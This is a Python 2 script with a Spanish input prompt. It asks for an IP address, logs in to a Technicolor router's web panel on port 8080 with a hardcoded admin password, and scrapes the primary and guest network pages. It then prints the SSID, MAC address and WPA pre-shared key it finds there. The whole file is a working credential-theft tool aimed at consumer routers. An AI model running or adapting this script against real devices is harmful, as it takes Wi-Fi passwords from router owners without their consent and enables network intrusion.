import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

ip=raw_input("pege la ip: \n")




def scan(ip):
    
    try:
    

        r = requests.get('http://'+ip+':8080/wlanPrimaryNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None)
        guess = requests.get('http://'+ip+':8080/wlanGuestNetwork.asp', auth=HTTPBasicAuth('admin', 'Uq-4GIt3M'), timeout=None)
        bs1 = BeautifulSoup(r.content, "html.parser")
#print bs1 requests.exceptions.ConnectionError
        
        for ssid in bs1.find_all("td",{"align":"middle", "valign":"top"}):
            x = ssid.text[24:]
            m = x[-19:]
            ma = m[1:-1]
            ide = x[0:-19]
            for passw in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
        
                print ip+".....Technicolor..........."+str(ma)+'.......'+str(ide)+"....."+passw["value"]+'...............Guess Enable'
            
    except requests.exceptions.ConnectionError:
        #print 'No tiene red de invitado'
        bs1 = BeautifulSoup(r.content, "html.parser")
        for ssid in bs1.find_all("td",{"align":"middle", "valign":"top"}):
            x = ssid.text[24:]
            m = x[-19:]
            ma = m[1:-1]
            ide = x[0:-19]
            for passw in bs1.find_all("input", {'name':"WpaPreSharedKey"}):
        
                print ip+".....Technicolor..........."+str(ma)+'.......'+str(ide)+"....."+passw["value"]+'...............Guess Disable'
        
        
        
            
scan(ip)